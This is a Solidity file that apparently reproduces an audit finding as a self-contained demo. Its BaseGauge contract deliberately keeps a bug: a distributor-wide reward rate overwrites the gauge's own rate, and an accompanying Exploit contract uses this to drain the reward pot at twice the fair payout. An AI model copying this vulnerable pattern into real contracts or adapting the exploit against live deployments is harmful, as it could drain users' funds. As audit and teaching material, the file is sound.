// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum BaseGauge — distributor rate overwrites the gauge rate
    (Pashov, finding #66355)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _calculatePendingRewards copies getRewardRate from the shared
    distributor. That rate covers every gauge, so this gauge pays the global
    rate out of a pot that was only funded for its own notified rate. */

interface IGaugeRewardsDistributor {
    function getRewardRate(address token) external view returns (uint256);
}

contract RewardToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Distributor is IGaugeRewardsDistributor {
    uint256 public rate;

    constructor(uint256 rate_) {
        rate = rate_;
    }

    function getRewardRate(address) external view returns (uint256) {
        return rate;
    }
}

struct RewardData {
    address distributor;
}

contract BaseGauge {
    uint256 public constant FINDING_ID = 66355;
    RewardData public rd;
    address public controller;
    RewardToken public rewardToken;
    uint256 public currentRate;
    uint256 public notifiedRate;
    uint256 public lastUpdate;
    uint256 public totalSupply;
    uint256 public lastPaid;
    mapping(address => uint256) public balanceOf;

    constructor(RewardToken token, address distributor_, uint256 notified, uint256 pot) {
        rewardToken = token;
        rd.distributor = distributor_;
        controller = address(0x1);
        notifiedRate = notified;
        currentRate = notified;
        token.mint(address(this), pot);
    }

    function stake(address user, uint256 amount) external {
        balanceOf[user] += amount;
        totalSupply += amount;
    }

    function fairPayout(address user) public view returns (uint256) {
        uint256 elapsed = block.timestamp - lastUpdate;
        if (totalSupply == 0 || elapsed == 0) return 0;
        return notifiedRate * elapsed * balanceOf[user] / totalSupply;
    }

    function _calculatePendingRewards(address token, address user) internal returns (uint256) {
        if (rd.distributor != address(0) && rd.distributor != controller) {
            try IGaugeRewardsDistributor(rd.distributor).getRewardRate(token) returns (uint256 rate) {
                if (rate > 0) {
                    currentRate = rate; // @> VULN: distributor-wide rate replaces this gauge's notified rate
                    // FIX: keep the rate stored when this gauge was notified
                }
            } catch {}
        }
        uint256 elapsed = block.timestamp - lastUpdate;
        uint256 pending;
        if (totalSupply > 0 && elapsed > 0) {
            pending = currentRate * elapsed * balanceOf[user] / totalSupply;
        }
        lastUpdate = block.timestamp;
        lastPaid = pending;
        return pending;
    }

    function claim(address user, address token) external returns (uint256 pending) {
        pending = _calculatePendingRewards(token, user);
        rewardToken.transfer(user, pending);
    }

    function claimFixed(address user) external returns (uint256 pending) {
        uint256 elapsed = block.timestamp - lastUpdate;
        pending = notifiedRate * elapsed * balanceOf[user] / totalSupply;
        lastUpdate = block.timestamp;
        rewardToken.transfer(user, pending);
    }
}

contract Exploit {
    uint256 public constant FINDING_ID = 66355;
    RewardToken public token;
    Distributor public distributor;
    BaseGauge public gauge;
    uint256 public fair;
    uint256 public claimed;

    constructor() {
        token = new RewardToken();
        distributor = new Distributor(200 ether);
        gauge = new BaseGauge(token, address(distributor), 100 ether, 200 ether);
    }

    function run() external {
        address attacker = msg.sender;
        gauge.stake(attacker, 1 ether);
        fair = gauge.fairPayout(attacker);
        claimed = gauge.claim(attacker, address(token));
        require(fair == 100 ether, "fair");
        require(claimed == 200 ether, "claimed");
        require(token.balanceOf(attacker) == 200 ether, "paid");
        require(token.balanceOf(address(gauge)) == 0, "pot");
    }
}
